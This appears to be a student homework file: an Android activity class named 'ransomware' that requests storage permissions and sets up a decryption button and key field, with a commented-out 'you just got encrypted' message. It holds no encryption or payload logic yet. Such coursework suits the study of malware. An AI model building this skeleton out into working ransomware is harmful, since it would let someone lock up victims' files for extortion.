package nordberg.katie.hw4;

import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

public class ransomware extends AppCompatActivity {
    public AppCompatActivity a;
    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        a = this;
        if (!PermissionHelper.hasStoragePerms((a))) {
        // If we don't have the needed permissions, we need to request them now before proceeding
        PermissionHelper.requestStoragePerms(a, 10);
        } else {
            Log.e("Ransomware", "We already got storage permissions so we don't need to request again");
        }

        Button btnDecrypt = this.findViewById(R.id.buttonDecrypt);
        EditText userDecryptionKey = this.findViewById(R.id.decryptionText);
//        Toast t = Toast.makeText(a, "Uh oh, you just got encrypted!")
    }
}
